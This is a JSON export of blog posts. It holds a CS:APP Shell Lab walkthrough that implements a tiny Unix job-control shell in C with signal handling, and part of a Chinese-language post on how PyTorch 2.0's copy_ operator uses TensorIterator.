[{"categories":["csapp"],"content":"Summary In this lab, we’ll become more familiar with the concepts of process control and signal by writing a simple Unix shell program that supports job control. Source code: [https://github.com/yewentao256/CSAPP_15213/tree/main/shelllab] ","date":"2023-06-23","objectID":"/posts/csapp/shell_lab/:1:0","tags":null,"title":"ShellLab","uri":"/posts/csapp/shell_lab/"},{"categories":["csapp"],"content":"How to launch(Using docker) Source from Yansongsongsong Firstly using a docker: docker run -d -p 9912:22 --name shelllab yansongsongsong/csapp:shelllab Then using vscode plugin remote ssh ssh root@127.0.0.1 -p 9912 password: THEPASSWORDYOUCREATED ","date":"2023-06-23","objectID":"/posts/csapp/shell_lab/:2:0","tags":null,"title":"ShellLab","uri":"/posts/csapp/shell_lab/"},{"categories":["csapp"],"content":"How to validate ./sdriver.pl -t trace01.txt -s ./tsh -a \"-p\" or make test01 You can compare the result with tshref ./sdriver.pl -t trace01.txt -s ./tshref -a \"-p\" or make rtest01 ","date":"2023-06-23","objectID":"/posts/csapp/shell_lab/:3:0","tags":null,"title":"ShellLab","uri":"/posts/csapp/shell_lab/"},{"categories":["csapp"],"content":"Trace 01 To shutdown the program when meeting EOF (ctrl-D in linux) It’s developed already. ","date":"2023-06-23","objectID":"/posts/csapp/shell_lab/:4:0","tags":null,"title":"ShellLab","uri":"/posts/csapp/shell_lab/"},{"categories":["csapp"],"content":"Trace 02 To shutdown the program using quit command. Only need to update eval function here. void eval(char *cmdline) { char * argv[MAXARGS]; /* args list */ parseline(cmdline, argv); /* parse command line to argv */ if (argv[0] == NULL) return; /* ignore empty command */ if (!strcmp(argv[0], \"quit\")) { exit(0); /* exit the shell */ } } ","date":"2023-06-23","objectID":"/posts/csapp/shell_lab/:5:0","tags":null,"title":"ShellLab","uri":"/posts/csapp/shell_lab/"},{"categories":["csapp"],"content":"Trace 03 Here we need to call /bin/echo binary and output \"tsh\u003e quit\", then quit This can be realized by using execve void eval(char *cmdline) { char *argv[MAXARGS]; /* args list */ parseline(cmdline, argv); /* parse command line to argv */ pid_t pid; if (argv[0] == NULL) return; /* ignore empty command */ if (!builtin_cmd(argv)) { /* not a builtin command */ if ((pid = fork()) == 0) { /* sub process execute here */ if (execve(argv[0], argv, environ) == -1) { /* not found */ printf(\"%s: command not found \\n\", argv[0]); exit(0); } } } } Note that we’ve move the quit function to builtin_cmd int builtin_cmd(char **argv) { if (!strcmp(argv[0], \"quit\")) { exit(0); /* exit the shell */ } return 0; /* not a builtin command */ } ","date":"2023-06-23","objectID":"/posts/csapp/shell_lab/:6:0","tags":null,"title":"ShellLab","uri":"/posts/csapp/shell_lab/"},{"categories":["csapp"],"content":"Trace 04 Here we need to support background job: ./myspin 1 \u0026 So we should use addjob(), deletejob() to manage jobs. And parse \u0026 by using parseline() to distinguish foreground job and background job. What’s more, we need to realize sigchld_handler to reap zombie subprocess. void eval(char *cmdline) { char *argv[MAXARGS]; int bg; /* whether runs in background */ pid_t pid; bg = parseline(cmdline, argv); /* parse command line to argv */ if (argv[0] == NULL) return; /* ignore empty command */ if (!builtin_cmd(argv)) { if ((pid = fork()) == 0) { if (execve(argv[0], argv, environ) == -1) { printf(\"%s: command not found \\n\", argv[0]); exit(0); } } else { /* parrent executes here */ addjob(jobs, pid, bg == 1 ? BG : FG, cmdline); if (!bg) { waitfg(pid); /* wait foreground job */ } else { printf(\"[%d] (%d) %s\", pid2jid(pid), pid, cmdline); } } } } void waitfg(pid_t pid) { while (pid == fgpid(jobs)) { sleep(0); } } void sigchld_handler(int sig) { pid_t pid; /* pid_t waitpid(pid_t pid, int *status, int options); pid == -1 means waiting for arbitrary sub process WHOHANG means that if no process exits, return 0 */ while ((pid = waitpid(-1, NULL, WNOHANG)) \u003e 0) { deletejob(jobs, pid); } } Looks all good, right? However, fork() may execute so fast that it exits before parent calls addjob, which can cause trouble. The parent may think that the subprocess is still running and keep waiting for it, while the subprocess has already finished. So we should block SIGCHLD signal before parent calls addjob to avoid this problem. void eval(char *cmdline) { // ... sigset_t sig_mask_child, oldset; /* signal set, unsigned long actually */ if (!builtin_cmd(argv)) { sigemptyset(\u0026sig_mask_child); /* set sigset all zero*/ sigaddset(\u0026sig_mask_child, SIGCHLD); /* add SIGCHLD to sig set*/ /* block signal SIGCHLD */ sigprocmask(SIG_BLOCK, \u0026sig_mask_child, \u0026oldset); if ((pid = fork()) == 0) { /* recover from blocking signal for child, we should do this because children inherit the blocked vectors of their parents */ sigprocmask(SIG_SETMASK, \u0026oldset, NULL); // execve()... } else { /* parrent executes here */ addjob(jobs, pid, bg == 1 ? BG : FG, cmdline); /* recover from blocking signal for parent */ sigprocmask(SIG_SETMASK, \u0026oldset, NULL); // ... } } } ","date":"2023-06-23","objectID":"/posts/csapp/shell_lab/:7:0","tags":null,"title":"ShellLab","uri":"/posts/csapp/shell_lab/"},{"categories":["csapp"],"content":"Trace 05 Trace 5 is quite simple here, the only thing we need to do is to implment the jobs command. int builtin_cmd(char **argv) { // ... if (!strcmp(argv[0], \"jobs\")) { listjobs(jobs); /* print jobs */ exit(0); } return 0; /* not a builtin command */ } ","date":"2023-06-23","objectID":"/posts/csapp/shell_lab/:8:0","tags":null,"title":"ShellLab","uri":"/posts/csapp/shell_lab/"},{"categories":["csapp"],"content":"Trace 06 We need to realize sigint_handler here. The easiest way is like this: void sigint_handler(int sig) { /* find foreground pid */ pid_t pid; if ((pid = fgpid(jobs)) \u003e 0) { printf(\"Job [%d] (%d) terminated by signal 2\\n\", pid2jid(pid), pid); kill(pid, sig); deletejob(jobs, pid); } } Note: we only kill the foreground process using kill(pid, sig) here, but not for the whole group by using -pid in kill function. This is an issue and we’ll solve it later. ","date":"2023-06-23","objectID":"/posts/csapp/shell_lab/:9:0","tags":null,"title":"ShellLab","uri":"/posts/csapp/shell_lab/"},{"categories":["csapp"],"content":"Trace 07 We should forward SIGINT only to foreground job. As we use kill(pid, sig) above instead of using kill(-pid, sig), we can still pass this trace. This is an issue since the subprocesses of foreground job are not cared, we’ll solve it later. ","date":"2023-06-23","objectID":"/posts/csapp/shell_lab/:10:0","tags":null,"title":"ShellLab","uri":"/posts/csapp/shell_lab/"},{"categories":["csapp"],"content":"Trace 08 We should forward SIGTSTP only to foreground job here. If we realize this like: void sigtstp_handler(int sig) { pid_t pid; if ((pid = fgpid(jobs)) \u003e 0) { printf(\"Job [%d] (%d) stopped by signal 20\\n\", pid2jid(pid), pid); kill(pid, sig); struct job_t * job = getjobpid(jobs, pid); job-\u003estate = ST; } } we’ll find that the process is hanging, traping into a deadlock. Let’s figure out what’s happening ps ajf PPID PID PGID SID TTY TPGID STAT UID TIME COMMAND 131 8983 8983 8983 pts/11 9748 Ss 0 0:00 /bin/zsh -i 8983 9748 9748 8983 pts/11 9748 R+ 0 0:00 \\_ ps ajf 131 679 679 679 pts/9 9666 Ss 0 0:01 /bin/zsh -i 679 9666 9666 679 pts/9 9666 S+ 0 0:00 \\_ make test08 9666 9667 9666 679 pts/9 9666 S+ 0 0:00 \\_ /usr/bin/perl ./sdriver.pl -t trace08. 9667 9668 9666 679 pts/9 9666 R+ 0 0:02 \\_ ./tsh -p 9668 9672 9666 679 pts/9 9666 T+ 0 0:00 \\_ ./myspin 5 We can find that only pid=9672 is suspended, while other processes are still running! And since we are waitfg(pid /* 9672 */);, here we are trapped. The solution of this problem is by using kill(-pid, sig) to send signal to the process group. However, we should forward SIGTSTP only to foreground job. So we need to make a change of our code, furthermore, using setpgid() to put subprocess into a new process group. Here is the code: void eval(char *cmdline) { // ... if (!builtin_cmd(argv)) { // ... if ((pid = fork()) == 0) { /* set subprocess into a new process group */ if (setpgid(0, 0) == -1) { perror(\"setpgid\"); exit(EXIT_FAILURE); } /* sub process executes here */ } // ... } } Also, update kill in sigint_handler to fix the issue mentioned in trace 06 and trace 07 void sigint_handler(int sig) { // ... kill(-pid, sig); } ","date":"2023-06-23","objectID":"/posts/csapp/shell_lab/:11:0","tags":null,"title":"ShellLab","uri":"/posts/csapp/shell_lab/"},{"categories":["csapp"],"content":"Trace 09 Here we need to process bg builtin command Firstly adding it in builtin command int builtin_cmd(char **argv) { // ... if (!strcmp(argv[0], \"bg\")) { do_bgfg(argv); /* do bg command */ return 1; } return 0; /* not a builtin command */ } Then realize the do_bgfg function void do_bgfg(char **argv) { int jid; pid_t pid; struct job_t *job; if (argv[1][0] == '%') { /* bg/fg %1 means job id = 1 */ jid = atoi(argv[1] + 1); job = getjobjid(jobs, jid); pid = job-\u003epid; } else { /* bg/fg 1 means process id = 1 */ pid = atoi(argv[1]); job = getjobpid(jobs, pid); jid = job-\u003ejid; } if (!strcmp(argv[0], \"bg\")) { printf(\"[%d] [%d] %s\", jid, pid, job-\u003ecmdline); if (kill(-pid, SIGCONT) == -1) { perror(\"Sending SIGCONT to bg job failed\"); exit(EXIT_FAILURE); } job-\u003estate = BG; } } ","date":"2023-06-23","objectID":"/posts/csapp/shell_lab/:12:0","tags":null,"title":"ShellLab","uri":"/posts/csapp/shell_lab/"},{"categories":["csapp"],"content":"Trace 10 Here we need to process fg builtin command. Similar to Trace 09, adding fg in builtin_cmd if (!strcmp(argv[0], \"bg\") || !strcmp(argv[0], \"fg\")) { do_bgfg(argv); /* do bg command */ return 1; } Then fulfill the do_bgfg function if (!strcmp(argv[0], \"bg\")) { // ... } else { if (job-\u003estate == ST) { if (kill(-pid, SIGCONT) == -1) { perror(\"Sending SIGCONT to fg job failed\"); exit(EXIT_FAILURE); } } job-\u003estate = FG; waitfg(pid); } ","date":"2023-06-23","objectID":"/posts/csapp/shell_lab/:13:0","tags":null,"title":"ShellLab","uri":"/posts/csapp/shell_lab/"},{"categories":["csapp"],"content":"Trace 11 Here we need to forward SIGINT to every process in foreground process group Since we create process group for every process (See Trace 08), and sending kill(-pid, ...) to every process in group. Nothing needs to do here. ","date":"2023-06-23","objectID":"/posts/csapp/shell_lab/:14:0","tags":null,"title":"ShellLab","uri":"/posts/csapp/shell_lab/"},{"categories":["csapp"],"content":"Trace 12 Forward SIGTSTP to every process in foreground process group Same as above, nothing needs to do here. ","date":"2023-06-23","objectID":"/posts/csapp/shell_lab/:15:0","tags":null,"title":"ShellLab","uri":"/posts/csapp/shell_lab/"},{"categories":["csapp"],"content":"Trace 13 Restart every stopped process in process group Same as above, nothing needs to do here. ","date":"2023-06-23","objectID":"/posts/csapp/shell_lab/:16:0","tags":null,"title":"ShellLab","uri":"/posts/csapp/shell_lab/"},{"categories":["csapp"],"content":"Trace 14 Here we should handle possible error. We should consider case when: argv[1] == NULL argv[1] is not a number argv[1] doesn’t matches current jobid/process id. Here is the code: void do_bgfg(char **argv) { int jid; pid_t pid; struct job_t *job; if (argv[1] == NULL) { printf(\"%s command requires PID or %%jobid argument\\n\", argv[0]); return; } if (argv[1][0] == '%') { /* %1 means job id = 1 */ if (strspn(argv[1] + 1, \"0123456789\") != strlen(argv[1]) - 1) { /* check all the characters are numbers */ printf(\"argument must be a PID or %%jobid\\n\"); return; } jid = atoi(argv[1] + 1); job = getjobjid(jobs, jid); if (job == NULL) { printf(\"(%d): No such job\\n\", jid); return; } pid = job-\u003epid; } else { /* process id */ if (strspn(argv[1], \"0123456789\") != strlen(argv[1])) { /* check all the characters are numbers */ printf(\"argument must be a PID or %%jobid\\n\"); return; } pid = atoi(argv[1]); job = getjobpid(jobs, pid); if (job == NULL) { printf(\"(%d): No such process\\n\", pid); return; } jid = job-\u003ejid; } // ... } ","date":"2023-06-23","objectID":"/posts/csapp/shell_lab/:17:0","tags":null,"title":"ShellLab","uri":"/posts/csapp/shell_lab/"},{"categories":["csapp"],"content":"Trace 15 Putting it all together. We directly pass this trace, too. ","date":"2023-06-23","objectID":"/posts/csapp/shell_lab/:18:0","tags":null,"title":"ShellLab","uri":"/posts/csapp/shell_lab/"},{"categories":["csapp"],"content":"Trace16 Here the shell are supposed to handle SIGTSTP and SIGINT signals that come from other processes instead of the terminal. We try to execute test16 at first, but then we find that we are trapped in ./mystop make test16 ./sdriver.pl -t trace16.txt -s ./tsh -a \"-p\" # # trace16.txt - Tests whether the shell can handle SIGTSTP and SIGINT # signals that come from other processes instead of the terminal. # tsh\u003e ./mystop 2 # blocking.... ps ajf to figure out why: PPID PID PGID SID TTY TPGID STAT UID TIME COMMAND 10361 10463 10463 10463 pts/4 16940 Ss 0 0:00 /bin/zsh -i 10463 16940 16940 10463 pts/4 16940 S+ 0 0:00 \\_ make test16 16940 16941 16940 10463 pts/4 16940 S+ 0 0:00 \\_ /usr/bin/perl ./sdriver.pl 16941 16942 16940 10463 pts/4 16940 S+ 0 0:00 \\_ ./tsh -p 16942 16944 16944 10463 pts/4 16940 T 0 0:00 \\_ ./mystop 2 Here the ./mystop 2 process has been stopped by it self. Howerver, our sigtstp_handler doesn’t capture the signal, and the job is still in FG state. To fix this issue, we should update the codes in sigchld_handler to receive the signal sent by subprocess. We can realize this by adding WUNTRACED in waitpid() void sigchld_handler(int sig) { pid_t pid; int status; struct job_t *job; /* `pid_t waitpid(pid_t pid, int *status, int options)` pid == -1 means waiting for arbitrary sub process WHOHANG means that if no process exits, return 0 WUNTRACED means if subprocess is suspended, return its pid */ while ((pid = waitpid(-1, \u0026status, WNOHANG | WUNTRACED)) \u003e 0) { job = getjobpid(jobs, pid); if (WIFEXITED(status)) { deletejob(jobs, pid); } else if (WIFSTOPPED(status)) { printf(\"Job [%d] (%d) stopped by signal %d\\n\", job-\u003ejid, pid, WSTOPSIG(status)); job-\u003estate = ST; } } } Fix the issue above! Then we find that we can’t handle the ./myint 2 command. Same as above, adding logic to sigchld_handler to handle this: while ((pid = waitpid(-1, \u0026status, WNOHANG | WUNTRACED)) \u003e 0) { job = getjobpid(jobs, pid); if (WIFEXITED(status)) { // ... } else if (WIFSIGNALED(status)) { printf(\"Job [%d] (%d) terminated by signal %d\\n\", job-\u003ejid, pid, WTERMSIG(status)); deletejob(jobs, pid); } else if (WIFSTOPPED(status)) { // ... } } Since we’ve handled deletejob in sigchld_handler(), we should remove it from current sigint_handler(). And the same idea, remove job-\u003estate = ST; in sigtstp_handler() Update like this: void sigint_handler(int sig) { /* find foreground pid */ pid_t pid; if ((pid = fgpid(jobs)) \u003e 0) { kill(-pid, sig); } } void sigtstp_handler(int sig) { pid_t pid; if ((pid = fgpid(jobs)) \u003e 0) { kill(-pid, sig); } } Finish this trace! ","date":"2023-06-23","objectID":"/posts/csapp/shell_lab/:19:0","tags":null,"title":"ShellLab","uri":"/posts/csapp/shell_lab/"},{"categories":["csapp"],"content":"Review Note: all the handlers logic are managed in parent process(tsh shell), so the calling chain of handlers may like this: User types control-c -\u003e parent handles in sigint_handler, forwarding the signal to subprocess -\u003e subprocess killed, sending signal to parent -\u003e parent handles it in sigchld_handler. To make sure every trace can be passed in our newest code, we execute all of them again. And all of the traces passed. Take trace 15 as an example: ➜ shlab-handout make rtest15 ./sdriver.pl -t trace15.txt -s ./tshref -a \"-p\" # # trace15.txt - Putting it all together # tsh\u003e ./bogus ./bogus: Command not found tsh\u003e ./myspin 10 Job [1] (23928) terminated by signal 2 tsh\u003e ./myspin 3 \u0026 [1] (23940) ./myspin 3 \u0026 tsh\u003e ./myspin 4 \u0026 [2] (23943) ./myspin 4 \u0026 tsh\u003e jobs [1] (23940) Running ./myspin 3 \u0026 [2] (23943) Running ./myspin 4 \u0026 tsh\u003e fg %1 Job [1] (23940) stopped by signal 20 tsh\u003e jobs [1] (23940) Stopped ./myspin 3 \u0026 [2] (23943) Running ./myspin 4 \u0026 tsh\u003e bg %3 %3: No such job tsh\u003e bg %1 [1] (23940) ./myspin 3 \u0026 tsh\u003e jobs [1] (23940) Running ./myspin 3 \u0026 [2] (23943) Running ./myspin 4 \u0026 tsh\u003e fg %1 tsh\u003e quit ➜ shlab-handout make test15 ./sdriver.pl -t trace15.txt -s ./tsh -a \"-p\" # # trace15.txt - Putting it all together # tsh\u003e ./bogus ./bogus: Command not found tsh\u003e ./myspin 10 Job [1] (23992) terminated by signal 2 tsh\u003e ./myspin 3 \u0026 [1] (24015) ./myspin 3 \u0026 tsh\u003e ./myspin 4 \u0026 [2] (24017) ./myspin 4 \u0026 tsh\u003e jobs [1] (24015) Running ./myspin 3 \u0026 [2] (24017) Running ./myspin 4 \u0026 tsh\u003e fg %1 Job [1] (24015) stopped by signal 20 tsh\u003e jobs [1] (24015) Stopped ./myspin 3 \u0026 [2] (24017) Running ./myspin 4 \u0026 tsh\u003e bg %3 (3): No such job tsh\u003e bg %1 [1] [24015] ./myspin 3 \u0026 tsh\u003e jobs [1] (24015) Running ./myspin 3 \u0026 [2] (24017) Running ./myspin 4 \u0026 tsh\u003e fg %1 tsh\u003e quit Note that we didn’t block signals in sigchld_handler(), and we can still pass the traces. However, we want to make our code better(and stronger), let’s add it to sigchld_handler(). If we don’t add it, in some cornor case(quite unlikely), when parent is dealing with one CHLD signal and receives INT or another CHLD signal, and both of them requires deletejob(), we will be in trouble. Here’s the code: void sigchld_handler(int sig) { pid_t pid; int status; struct job_t *job; /* signal blocker */ sigset_t mask_all, prev_all; sigfillset(\u0026mask_all); /* `pid_t waitpid(pid_t pid, int *status, int options)` pid == -1 means waiting for arbitrary sub process WHOHANG means that if no process exits, return 0 WUNTRACED means if subprocess is suspended, return its pid */ while ((pid = waitpid(-1, \u0026status, WNOHANG | WUNTRACED)) \u003e 0) { if (sigprocmask(SIG_BLOCK, \u0026mask_all, \u0026prev_all) \u003c 0) { perror(\"sigprocmask error\"); exit(1); } job = getjobpid(jobs, pid); if (WIFEXITED(status)) { deletejob(jobs, pid); } else if (WIFSIGNALED(status)) { printf(\"Job [%d] (%d) terminated by signal %d\\n\", job-\u003ejid, pid, WTERMSIG(status)); deletejob(jobs, pid); } else if (WIFSTOPPED(status)) { printf(\"Job [%d] (%d) stopped by signal %d\\n\", job-\u003ejid, pid, WSTOPSIG(status)); job-\u003estate = ST; } if (sigprocmask(SIG_SETMASK, \u0026prev_all, NULL) \u003c 0) { perror(\"sigprocmask error\"); exit(1); } } } ","date":"2023-06-23","objectID":"/posts/csapp/shell_lab/:20:0","tags":null,"title":"ShellLab","uri":"/posts/csapp/shell_lab/"},{"categories":["csapp"],"content":"Appendix A complete tsh.c: /* * tsh - A tiny shell program with job control * * Author: Peter */ #include \u003cctype.h\u003e #include \u003cerrno.h\u003e #include \u003csignal.h\u003e #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cstring.h\u003e #include \u003csys/types.h\u003e #include \u003csys/wait.h\u003e #include \u003cunistd.h\u003e /* Misc manifest constants */ #define MAXLINE 1024 /* max line size */ #define MAXARGS 128 /* max args on a command line */ #define MAXJOBS 16 /* max jobs at any point in time */ #define MAXJID 1 \u003c\u003c 16 /* max job ID */ /* Job states */ #define UNDEF 0 /* undefined */ #define FG 1 /* running in foreground */ #define BG 2 /* running in background */ #define ST 3 /* stopped */ /* * Jobs states: FG (foreground), BG (background), ST (stopped) * Job state transitions and enabling actions: * FG -\u003e ST : ctrl-z * ST -\u003e FG : fg command * ST -\u003e BG : bg command * BG -\u003e FG : fg command * At most 1 job can be in the FG state. */ /* Global variables */ extern char **environ; /* defined in libc */ char prompt[] = \"tsh\u003e \"; /* command line prompt (DO NOT CHANGE) */ int verbose = 0; /* if true, print additional output */ int nextjid = 1; /* next job ID to allocate */ char sbuf[MAXLINE]; /* for composing sprintf messages */ struct job_t { /* The job struct */ pid_t pid; /* job PID */ int jid; /* job ID [1, 2, ...] */ int state; /* UNDEF, BG, FG, or ST */ char cmdline[MAXLINE]; /* command line */ }; struct job_t jobs[MAXJOBS]; /* The job list */ /* End global variables */ /* Function prototypes */ /* Here are the functions that you will implement */ void eval(char *cmdline); int builtin_cmd(char **argv); void do_bgfg(char **argv); void waitfg(pid_t pid); void sigchld_handler(int sig); void sigtstp_handler(int sig); void sigint_handler(int sig); /* Here are helper routines that we've provided for you */ int parseline(const char *cmdline, char **argv); void sigquit_handler(int sig); void clearjob(struct job_t *job); void initjobs(struct job_t *jobs); int maxjid(struct job_t *jobs); int addjob(struct job_t *jobs, pid_t pid, int state, char *cmdline); int deletejob(struct job_t *jobs, pid_t pid); pid_t fgpid(struct job_t *jobs); struct job_t *getjobpid(struct job_t *jobs, pid_t pid); struct job_t *getjobjid(struct job_t *jobs, int jid); int pid2jid(pid_t pid); void listjobs(struct job_t *jobs); void usage(void); void unix_error(char *msg); void app_error(char *msg); typedef void handler_t(int); handler_t *Signal(int signum, handler_t *handler); /* * main - The shell's main routine */ int main(int argc, char **argv) { char c; char cmdline[MAXLINE]; int emit_prompt = 1; /* emit prompt (default) */ /* Redirect stderr to stdout (so that driver will get all output * on the pipe connected to stdout) */ dup2(1, 2); /* Parse the command line */ while ((c = getopt(argc, argv, \"hvp\")) != EOF) { switch (c) { case 'h': /* print help message */ usage(); break; case 'v': /* emit additional diagnostic info */ verbose = 1; break; case 'p': /* don't print a prompt */ emit_prompt = 0; /* handy for automatic testing */ break; default: usage(); } } /* Install the signal handlers */ /* These are the ones you will need to implement */ Signal(SIGINT, sigint_handler); /* ctrl-c */ Signal(SIGTSTP, sigtstp_handler); /* ctrl-z */ Signal(SIGCHLD, sigchld_handler); /* Terminated or stopped child */ /* This one provides a clean way to kill the shell */ Signal(SIGQUIT, sigquit_handler); /* Initialize the job list */ initjobs(jobs); /* Execute the shell's read/eval loop */ while (1) { /* Read command line */ if (emit_prompt) { printf(\"%s\", prompt); fflush(stdout); } if ((fgets(cmdline, MAXLINE, stdin) == NULL) \u0026\u0026 ferror(stdin)) app_error(\"fgets error\"); if (feof(stdin)) { /* End of file (ctrl-d) */ fflush(stdout); exit(0); } /* Evaluate the command line */ eval(cmdline); fflush(stdout); fflush(stdout); } exit(0); /* control never reaches here */ } /* * eval - Evaluate the command line that the user has just typed in * * If the user has requested a built-in command (quit, jobs, bg or fg) * then execute it imme","date":"2023-06-23","objectID":"/posts/csapp/shell_lab/:21:0","tags":null,"title":"ShellLab","uri":"/posts/csapp/shell_lab/"},{"categories":["pytorch"],"content":"Summary This article introduces the process of pytorch 2.0 calling ops, using contiguous as an example. ","date":"2023-05-13","objectID":"/posts/pytorch/how_pytorch_call_op_3/:1:0","tags":null,"title":"How Pytorch 2.0 Call Ops(3)","uri":"/posts/pytorch/how_pytorch_call_op_3/"},{"categories":["pytorch"],"content":"To be translated Oh Sorry! This blog has’t been translated to English, please wait for a little while… ","date":"2023-05-13","objectID":"/posts/pytorch/how_pytorch_call_op_3/:2:0","tags":null,"title":"How Pytorch 2.0 Call Ops(3)","uri":"/posts/pytorch/how_pytorch_call_op_3/"},{"categories":["pytorch"],"content":"9. copy_算子与TensorIterator 在clone算子中，创建好指定memory format的tensor之后，我们便调用copy算子 // aten/src/ATen/native/Copy.cpp Tensor\u0026 copy_(Tensor\u0026 self, const Tensor\u0026 src, bool non_blocking) { // ... if (src._is_zerotensor()) { return self.zero_(); } copy_impl(self, src, non_blocking); return self; } static Tensor \u0026 copy_impl(Tensor \u0026 self, const Tensor \u0026 src, bool non_blocking) { // ... if (self.is_same(src)) { return self; } // ... // 如果self和src是相同storage的view const bool is_same_data = ( self.is_alias_of(src) \u0026\u0026 // storage相同 self.storage_offset() == src.storage_offset() \u0026\u0026 // storage offset相同 self.strides().equals(src.strides()) \u0026\u0026 self.sizes().equals(src.sizes()) \u0026\u0026 self.scalar_type() == src.scalar_type() ); if (is_same_data) { return self; } // 构建了at::TensorIterator，划定input output 便于处理device、dtype等相关内容 auto iter = TensorIteratorConfig() // 将tensor存储到TensorIteratorConfig中的SmallVector\u003cc10::MaybeOwned\u003cTensorBase\u003e, 4\u003e tensors_; // 注意此处顺序，先add了output，保证output在list的第一位 .add_output(self) .add_input(src) .resize_outputs(false) // 设置变量，下同 .check_all_same_dtype(false) .check_all_same_device(false) .build(); // 新建一个TensorIterator，使用上面构建的config build if (iter.numel() == 0) { return self; } DeviceType device_type = iter.device_type(0); if (iter.device_type(1) == kCUDA) { device_type = kCUDA; } else if (iter.device_type(1) == kHIP) { device_type = kHIP; } else if (iter.device_type(1) == kMPS) { device_type = kMPS; } // ... copy_stub(device_type, iter, non_blocking); return self; } 这里展开补充一下tensor iterator build部分的代码 // aten/src/ATen/TensorIterator.cpp void TensorIteratorBase::build(TensorIteratorConfig\u0026 config) { is_reduction_ = config.is_reduction_; enforce_linear_iteration_ = config.enforce_linear_iteration_; // 将config中的tensors_转存到iterator的SmallVector\u003cOperandInfo, 4\u003e operands_; populate_operands(config); // 设置 `is_output` 等 flag，判断是否input output是相同tensor(inplace操作) mark_outputs(); // 检查output 内存没有overlap，同时与input不共享存储 compute_mem_overlaps(config); // 计算out name compute_names(config); // 计算广播的shape，逻辑为首先取output的shape作为shape_存储，如果input的tensor shape与shape_不同，则infer出新的shape，详见下文 compute_shape(config); // 如果output需要resize（与shape_不同），则打上标记 mark_resize_outputs(config); // 计算device（取第一个不为cpu的device作为common device）和dtype（取第一个input tensor的dtype作为conmon_dtype_，取第一个output tensor的dtype作为output_dtype_） compute_types(config); // 尝试快速构建output tensor（比如如果所有tensor都是contiguous、channals last，那就可以快速infer output/resize（如果需要），set name等） if (!fast_set_up(config)) { // 计算每个tensor广播后的stride（实际上是计算出op.stride_bytes（stride * element_size）如本例中，shape_为[1, 64, 5, 4], output.stride_bytes = [5120, 4, 1024, 256] compute_strides(config); // 此处对tensor的shape、stride进行重排序，将stride[0]作为最快的步进维度（stride升序排列），如本例中，shape_变为[64, 4, 5, 1], output.stride_bytes = [4, 256, 1024, 5120] reorder_dimensions(); // 如果output没有defined，这里进行allocate allocate_or_resize_outputs(); // 如果每个tensor对应dim size为1或shape[n] * stride[n] == stride[n + 1]，合并相邻的dimension。为什么要合并相邻dimension呢？这样可以有效提升取址运算效率，也便于之后取stride遍历。我们下文展开说明这段代码 if (!is_meta_) coalesce_dimensions(); } // ... } 我们再进一步展开如何计算广播的代码 // aten/src/ATen/TensorIterator.cpp void TensorIteratorBase::compute_shape(const TensorIteratorConfig\u0026 config) { // ... for (auto\u0026 op : operands_) { // ... if (shape_.empty()) { shape_ = shape; } else if (!shape.equals(shape_)) { all_ops_same_shape_ = false; shape_ = infer_size_dimvector(shape_, shape); } } } // aten/src/ATen/ExpandUtils.cpp DimVector infer_size_dimvector(IntArrayRef a, IntArrayRef b) { return infer_size_impl\u003cDimVector, IntArrayRef\u003e(a, b); } template \u003ctypename Container, typename ArrayType\u003e Container infer_size_impl(ArrayType a, ArrayType b) { // 例如：a = {2, 1, 3}， b = {4, 3} size_t dimsA = a.size(); size_t dimsB = b.size(); size_t ndim = dimsA \u003e dimsB ? dimsA : dimsB; // 取更大的dim，例如 ndim = 3 Container expandedSizes(ndim); // 使用 ptrdiff_t 来确保有符号的比较 for (ptrdiff_t i = (ptrdiff_t)ndim - 1; i \u003e= 0; --i) { ptrdiff_t offset = ndim - 1 - i; ptrdiff_t dimA = dimsA - 1 - offset; // 相当于 dimsA - ndim + i ptrdiff_t dimB = dimsB ","date":"2023-05-13","objectID":"/posts/pytorch/how_pytorch_call_op_3/:3:0","tags":null,"title":"How Pytorch 2.0 Call Ops(3)","uri":"/posts/pytorch/how_pytorch_call_op_3/"},{"categories":["pytorch"],"content":"10. copy算子：kernel执行 回到上文，copy_stub进行一轮dispatch后调用到copy_kernel(device_type用于dispatch到不同的kernel，到具体kernel时已经没有了这个参数)。此外， // aten/src/ATen/native/cpu/CopyKernel.cpp void copy_kernel(TensorIterator\u0026 iter, bool /*non_blocking*/) { ScalarType dtype = iter.dtype(0); // ... auto strides_out = iter.strides(0); auto strides_in = iter.strides(1); if (dtype == iter.dtype(1)) { copy_same_dtype(iter, requires_conj, requires_neg); } else if (/* bfloat16 */) { float_bfloat16_copy_kernel(iter, requires_neg); } else { // 如果类型不一致，走到该分支 // AT_DISPATCH_ALL_TYPES_AND_COMPLEX_AND4 宏 switch 处理数据类型 // 如果`has_contiguous_first_dim`为true（两tensor的 stride[0] == elementsize） // 则直接调用iter.for_each直接传入一个带类型转化的匿名函数 // 否则调用cpu_kernel(aten/src/ATen/native/cpu/Loops.h)，本质是调用`iter.for_each`传入`basic_loop`的匿名函数（basic_loop可以支持任意stride的1d slice） // basic loop为何能支持任意stride呢？请继续阅读本文，之后会进行介绍 AT_DISPATCH_ALL_TYPES_AND_COMPLEX_AND4(ScalarType::ComplexHalf, ScalarType::Half, ScalarType::Bool, ScalarType::BFloat16, dtype, \"copy_\", [\u0026] { using dest_t = scalar_t; AT_DISPATCH_ALL_TYPES_AND_COMPLEX_AND4(ScalarType::ComplexHalf, ScalarType::Half, ScalarType::Bool, ScalarType::BFloat16, iter.dtype(1), \"copy_\", [\u0026] { if (iter.has_contiguous_first_dim()) { TORCH_INTERNAL_ASSERT(iter.ninputs() == 1); TORCH_INTERNAL_ASSERT(iter.noutputs() == 1); iter.for_each([](char **data, const int64_t *strides, int64_t size) { auto src = reinterpret_cast\u003cconst scalar_t*\u003e(data[1]); auto dst = reinterpret_cast\u003cdest_t*\u003e(data[0]); at::vec::convert(src, dst, size); }); } else { cpu_kernel(iter, [](scalar_t x) -\u003e dest_t { return c10::convert\u003cdest_t\u003e(x); }); } }); }); // ... } } 我们重点看类型一致的情况（contiguous到这里一定是类型一致的），因为我们不需要取负也不需要共轭，所以调用到direct_copy_kernel函数 // aten/src/ATen/native/cpu/CopyKernel.cpp void direct_copy_kernel(TensorIteratorBase \u0026iter) { ScalarType dtype = iter.dtype(0); if (isQIntType(dtype)) { // 量化整数类型... } else if (dtype == ScalarType::ComplexHalf) { // 半精度复数 } else { AT_DISPATCH_ALL_TYPES_AND_COMPLEX_AND3( kBool, kHalf, kBFloat16, dtype, \"copy_kernel\", [\u0026] { cpu_kernel_vec( iter, [=](scalar_t a) -\u003e scalar_t { return a; }, 